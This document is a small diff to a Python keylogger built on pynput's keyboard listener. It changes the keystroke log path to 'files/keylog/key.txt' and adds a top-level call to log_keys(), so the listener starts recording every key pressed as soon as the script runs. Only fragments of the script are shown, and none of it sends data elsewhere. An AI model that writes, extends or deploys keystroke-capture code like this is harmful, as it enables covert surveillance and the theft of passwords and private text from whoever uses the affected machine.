@@ -5,7 +5,7 @@
 from pynput import keyboard
 
 def log_keys():
-    f = open("key.txt", "a")
+    f = open("files/keylog/key.txt", "a")
 
     def on_press(key):
         if key == keyboard.Key.esc:
@@ -23,3 +23,5 @@ def log_keys():
     listener = keyboard.Listener(on_press=on_press)
     listener.start()  # start to listen on a separate thread
     listener.join()
+
+log_keys()
